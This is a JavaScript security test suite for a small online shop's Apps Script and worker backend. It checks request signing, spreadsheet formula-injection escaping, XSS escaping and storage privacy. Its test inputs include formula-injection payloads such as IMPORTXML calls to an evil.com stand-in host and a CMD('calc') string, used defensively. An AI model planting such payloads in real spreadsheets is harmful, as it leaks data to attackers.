const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const crypto = require('node:crypto');

const codeSource = fs.readFileSync(require.resolve('../backend/Code.gs'), 'utf8');
const appSource = fs.readFileSync(require.resolve('../assets/js/app.js'), 'utf8');
const configSource = fs.readFileSync(require.resolve('../config.js'), 'utf8');
const { handleRequest } = require('../backend/stripe-worker.cjs');

const {gasHarness}=require('./helpers/gas-harness.cjs');

test('GAS authorization: direct unauthenticated POSTs are rejected and append no rows', () => {
  const { context, sheets, mails } = gasHarness();

  // Attacker attempting fake order injection
  const fakeOrder = {
    type: 'order',
    method: 'manual',
    customer: { name: 'Attacker Fake Order', email: 'attacker@evil.com' },
    items: [],
    totalEur: 99999
  };
  const res1 = context.doPost({ postData: { contents: JSON.stringify(fakeOrder) } });
  assert.equal(res1.ok, false);
  assert.equal(res1.error, 'Unauthorized request');
  assert.equal(sheets.Orders.length, 1); // Only header row
  assert.equal(mails.length, 0); // No quota exhaustion

  // Attacker attempting direct contact injection
  const fakeContact = { type: 'contact', name: 'Spammer', comment: 'Spam text' };
  const res2 = context.doPost({ postData: { contents: JSON.stringify(fakeContact) } });
  assert.equal(res2.ok, false);
  assert.equal(sheets.Messages.length, 1);

  // Attacker attempting direct chat_log injection
  const fakeChat = { type: 'chat_log', sessionId: 'AH-FAKE-01', question: 'DDoS' };
  const res3 = context.doPost({ postData: { contents: JSON.stringify(fakeChat) } });
  assert.equal(res3.ok, false);
  assert.equal(sheets['Chatbot Log'].length, 1);
});

test('GAS authorization: HMAC-signed Worker payloads are accepted and recorded', () => {
  const secret = 'worker-shared-secret';
  const { context, sheets, mails } = gasHarness(secret);

  const orderPayload = {
    action: 'manual_order',
    method: 'orange_money',
    totalEur: 120,
    subtotalEur: 100,
    shippingEur: 20,
    customer: { name: 'Legitimate Buyer', email: 'buyer@example.com', phone: '+24595000000' },
    items: [{ title: 'Crochet Hair', qty: 1, opts: { len: '16' } }],
    text: 'Legitimate Orange Money order.'
  };

  const raw = JSON.stringify(orderPayload);
  const signature = crypto.createHmac('sha256', secret).update(raw).digest('hex');
  const res = context.doPost({
    postData: { contents: JSON.stringify({ payload: raw, signature }) }
  });

  assert.equal(res.ok, true);
  assert.equal(res.saved, true);
  assert.equal(sheets.Orders.length, 2);
  assert.equal(sheets.Orders[1][2], 'Legitimate Buyer');
  assert.equal(mails.length, 1);
});

test('GAS formula injection: safeCell_ neutralizes spreadsheet formula prefixes', () => {
  const { context } = gasHarness();
  const payloads = [
    ['=SUM(1,2)', "'=SUM(1,2)"],
    ['=IMPORTXML("https://evil.com","//a")', "'=IMPORTXML(\"https://evil.com\",\"//a\")"],
    ['+CMD("calc")', "'+CMD(\"calc\")"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1:B10)', "'@SUM(A1:B10)"],
    ['  =formula', "'=formula"],
    ['\t=cmd', "'=cmd"],
    ['\r\n=formula', "'=formula"],
    ['Normal text', 'Normal text'],
    ['123.45', '123.45'],
    [null, ''],
    [undefined, '']
  ];

  for (const [input, expected] of payloads) {
    const result = context.safeCell_(input, 100);
    assert.equal(result, expected, `Failed for input: ${input}`);
  }
});

test('GAS formula injection: buildOrderRow_ sanitizes all user-controlled customer strings', () => {
  const { context } = gasHarness();
  const maliciousOrder = {
    method: '=EVIL()',
    customer: {
      name: '=IMPORTXML("http://evil.com/leak")',
      email: '+hack@example.com',
      phone: '@call(123)'
    },
    items: [
      { title: '=FORMULA_IN_TITLE', qty: 1, opts: { opt1: '=OPTS' } }
    ],
    coupon: '=COUPON',
    fulfillmentMethod: 'delivery',
    totalEur: 100,
    subtotalEur: 80,
    shippingEur: 20
  };

  const row = context.buildOrderRow_(maliciousOrder);
  // row indices: [0:date, 1:orderNum, 2:name, 3:email, 4:phone, 5:method, 6:items, 7:subtotal, ...]
  assert.match(row[2], /^'=IMPORTXML/);
  assert.match(row[3], /^'\+hack@example\.com/);
  assert.match(row[4], /^'@call\(123\)/);
  assert.match(row[5], /^'=EVIL\(\)/);
  assert.match(row[6], /'=FORMULA_IN_TITLE/);
});

test('Client config: public config.js does not expose raw Google Apps Script backendURL', () => {
  const c = {};
  c.window = c;
  vm.createContext(c);
  vm.runInContext(configSource, c);
  assert.equal(c.CONFIG.backendURL, '', 'CONFIG.backendURL must be empty in public client config');
  assert.equal(c.CONFIG.subscribeURL, '/public/subscribe');
  assert.equal(c.CONFIG.chatLogURL, '/public/chat-log');
});

test('Privacy (AH-SEC-05): checkout draft is persisted in sessionStorage only and localStorage is purged', () => {
  const sessionData = new Map();
  const localData = new Map();

  const c = {
    sessionStorage: {
      getItem: k => sessionData.get(k) || null,
      setItem: (k, v) => sessionData.set(k, v),
      removeItem: k => sessionData.delete(k)
    },
    localStorage: {
      getItem: k => localData.get(k) || null,
      setItem: (k, v) => localData.set(k, v),
      removeItem: k => localData.delete(k)
    }
  };

  vm.createContext(c);
  const draftFns = appSource.slice(
    appSource.indexOf('const CHECKOUT_DRAFT_KEY'),
    appSource.indexOf('function renderCheckoutPage()')
  );
  vm.runInContext(draftFns, c);

  // Saving a draft must write to sessionStorage and never to localStorage
  c.saveCheckoutDraft({ first: 'Jane', email: 'jane@example.com' });
  assert.ok(sessionData.has('ash_checkout_draft'));
  assert.equal(localData.has('ash_checkout_draft'), false, 'localStorage must NOT hold customer PII');

  // If old draft exists in localStorage, loading migrates and purges it from localStorage
  sessionData.clear();
  localData.set('ash_checkout_draft', JSON.stringify({ first: 'OldDraft' }));
  const loaded = c.loadCheckoutDraft();
  assert.equal(loaded.first, 'OldDraft');
  assert.equal(localData.has('ash_checkout_draft'), false, 'Legacy localStorage draft must be purged');
});

test('XSS hardening (AH-SEC-06): product view escapes description DOM sink', () => {
  assert.match(appSource, /\$\{escapeHTML\(p\.description\)\}/, 'p.description must be escaped with escapeHTML');
  assert.doesNotMatch(appSource, /<p>\$\{p\.description\}<\/p>/, 'Raw unescaped p.description sink must not exist');
});

test('Privacy (AH-SEC-07): WhatsApp handoff minimizes residential street address', () => {
  const placeOrderSlice = appSource.slice(
    appSource.indexOf('function placeOrder(btn)'),
    appSource.indexOf('function showOrderConfirmation(')
  );
  assert.doesNotMatch(placeOrderSlice, /Morada: \$\{addressLine\}/);
  assert.doesNotMatch(placeOrderSlice, /morada completa registada no pedido/);
});

test('Worker edge: /public/csp-report endpoint handles reports with HTTP 204', async () => {
  const req = new Request('https://asheerahhair.com/public/csp-report', {
    method: 'POST',
    headers: { Origin: 'https://asheerahhair.com', 'Content-Type': 'application/csp-report' },
    body: JSON.stringify({ 'csp-report': { 'document-uri': 'https://asheerahhair.com/checkout.html' } })
  });
  const res = await handleRequest(req, { SITE_ORIGIN: 'https://asheerahhair.com', WORKER_GAS_SECRET:'local-test', REVIEW_MEDIA:{get:async()=>null,put:async()=>({etag:'1'})} });
  assert.equal(res.status, 204);
});
